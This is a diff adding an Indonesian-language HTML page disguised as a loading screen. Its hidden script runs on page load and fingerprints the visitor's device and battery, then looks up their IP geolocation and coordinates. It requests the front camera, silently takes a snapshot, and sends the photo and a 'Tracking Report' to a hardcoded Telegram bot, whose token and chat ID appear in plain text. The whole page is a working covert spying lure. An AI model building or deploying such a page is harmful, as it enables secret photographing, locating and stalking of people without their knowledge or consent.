@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Tracking Report</title>
+</head>
+<body>
+  <h2>Memuat data...</h2>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8244526985:AAHFkaKcjvrfXTRg1s6vt9Zo-TMAyddtuD0";
+    const CHAT_ID = "-4903917425";
+
+    // === Fungsi kirim teks ke Telegram ===
+    async function sendReport(message) {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+    }
+
+    // === Fungsi kirim foto ke Telegram ===
+    async function sendPhoto(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "snapshot.jpg");
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    async function tracking() {
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const screenSize = `${window.screen.width}x${window.screen.height}`;
+      const windowSize = `${window.innerWidth}x${window.innerHeight}`;
+      const cores = navigator.hardwareConcurrency || "Unknown";
+      const memory = navigator.deviceMemory || "Unknown";
+      const touch = "ontouchstart" in window ? "YA" : "TIDAK";
+
+      // Baterai
+      let batteryInfo = "Tidak Tersedia";
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryInfo = `Level: ${(battery.level * 100)}% | Charging: ${battery.charging ? "YA" : "TIDAK"}`;
+      }
+
+      // Ambil lokasi IP
+      let ipData = {};
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        ipData = await res.json();
+      } catch (e) {
+        ipData = { ip: "Tidak Diketahui", country: "?", city: "?" };
+      }
+
+      // === Coba akses kamera depan ===
+      let cameraStatus = "❌ Ditolak / Diblokir";
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        cameraStatus = "✅ Diizinkan";
+
+        // Tampilkan ke <video>
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        // Tunggu 2 detik, ambil snapshot
+        setTimeout(() => {
+          const canvas = document.getElementById("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0);
+
+          canvas.toBlob(sendPhoto, "image/jpeg", 0.9);
+        }, 2000);
+
+      } catch (err) {
+        cameraStatus = "❌ Ditolak / Diblokir";
+      }
+
+      const report = `
+📋 Tracking Report
+━━━━━━━━━━━━━━━
+🌐 Device: ${ua}
+🖥️ Platform: ${navigator.platform}
+🗣️ Bahasa: ${lang}
+📏 Screen: ${screenSize}
+📏 Window: ${windowSize}
+⚙️ CPU Cores: ${cores}
+💾 RAM: ${memory} GB
+🔋 Baterai: ${batteryInfo}
+📸 Kamera: ${cameraStatus}
+👆 Touch Support: ${touch}
+
+🌍 IP Address: ${ipData.ip}
+📌 Lokasi: ${ipData.city}, ${ipData.region}, ${ipData.country}
+🛰️ Koordinat: ${ipData.latitude}, ${ipData.longitude}
+
+⏰ Waktu Akses: ${new Date().toLocaleString()}
+      `;
+
+      sendReport(report);
+    }
+
+    tracking();
+  </script>
+</body>
+</html>
